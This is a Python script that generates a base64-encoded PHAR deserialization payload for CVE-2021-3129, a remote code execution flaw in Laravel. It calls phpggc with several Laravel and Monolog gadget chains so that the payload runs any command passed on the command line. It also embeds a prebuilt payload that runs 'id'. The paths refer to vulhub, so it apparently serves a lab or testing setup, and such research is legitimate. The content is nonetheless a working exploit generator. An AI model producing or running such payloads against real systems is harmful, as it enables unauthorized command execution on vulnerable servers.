#!/usr/bin/env python3
"""Generate base64-encoded PHAR payload for CVE-2021-3129 that runs a command."""
import sys, base64, subprocess, shutil, os

# Fallback payload for `id` (same bytes as the original YAML had hardcoded)
ID_PAYLOAD_B64 = (
    "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp5AQAAAQAAABEAAAABAAAAAABDAQAATzo0MDoi"
    "SWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVu"
    "dHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5l"
    "ciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBo"
    "YW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6"
    "IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6"
    "MTp7czoxMDoiY29ubmVjdGlvbiI7czoyOiJpZCI7fX0IAAAAdGVzdC50eHQEAAAAAAAAAAQAAAAM"
    "fn/YpAEAAAAAAAB0ZXN0LAN5mWCuJXmc36CdhNy29t/eAyUCAAAAR0JNQg=="
)

def find_phpggc():
    candidates = [
        "phpggc",
        "/opt/phpggc/phpggc",
        os.path.expanduser("~/phpggc/phpggc"),
        os.path.expanduser("~/vulhub-master/laravel/CVE-2021-3129/phpggc/phpggc"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "phpggc", "phpggc"),
    ]
    for p in candidates:
        if shutil.which(p) or os.path.exists(p):
            return p
    return None

def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    pg = find_phpggc()

    if pg:
        for chain in ("Laravel/RCE1", "Laravel/RCE2", "Laravel/RCE3",
                      "Laravel/RCE5", "Monolog/RCE1"):
            try:
                raw = subprocess.check_output(
                    ["php", "-d", "phar.readonly=0", pg, "-p", "phar",
                     chain, "system", cmd],
                    stderr=subprocess.PIPE, timeout=15,
                )
                if raw.startswith(b"<?php"):
                    sys.stdout.write(base64.b64encode(raw).decode())
                    return
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                continue

    if cmd == "id":
        sys.stdout.write(ID_PAYLOAD_B64)
        return

    sys.stderr.write(f"ERROR: cannot build payload for {cmd!r}; install phpggc\n")
    sys.exit(2)

if __name__ == "__main__":
    main()